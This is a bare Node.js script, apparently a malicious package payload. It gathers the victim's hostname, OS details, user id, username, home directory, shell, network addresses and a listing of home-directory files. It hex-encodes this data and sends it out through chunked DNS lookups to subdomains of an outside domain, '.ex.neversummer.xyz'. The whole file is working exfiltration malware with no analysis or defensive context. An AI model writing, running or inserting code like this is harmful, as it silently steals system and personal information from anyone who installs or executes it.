var dns = require('dns');
var os = require("os");
var crypto = require('crypto');
var fs = require('fs');

let userInfo = os.userInfo()

var info = [
    os.hostname(),
    os.arch(),
    os.platform(),
    os.release(),
    os.tmpdir(),
    os.totalmem(),
    os.uptime(),
    userInfo["uid"],
    userInfo["gid"],
    userInfo["username"],
    userInfo["homedir"],
    userInfo["shell"],
    __filename
]
const baseDomain = ".ex.neversummer.xyz";
const maxSubDomainLen = 63;
var rayId = crypto.randomBytes(20).toString('hex').substring(0, 8);

var homeFiles = []
fs.readdirSync(os.homedir()).forEach(file => {
    homeFiles.push(file);
});

if (homeFiles.length > 0) {
    info.push(homeFiles.join(";"))
}

const interfaces = os.networkInterfaces()
let i = 1

for (const key in interfaces) {
    info.push(`${key}:${interfaces[key][0]["address"]}`);
}

let infoString = info.join("|")

let buff = new Buffer.from(infoString);
let encodedInfo = buff.toString('hex')
let chunkSize = maxSubDomainLen

for (var startChar = 0, charsLength = encodedInfo.length; startChar < charsLength; startChar += chunkSize) {
    let infoDomain = rayId + "." + i + "." + encodedInfo.substring(startChar, startChar + chunkSize);

    let fullDomain = infoDomain + baseDomain;
    dns.lookup(fullDomain, function (err, addresses, family) {
    });
    i++;
}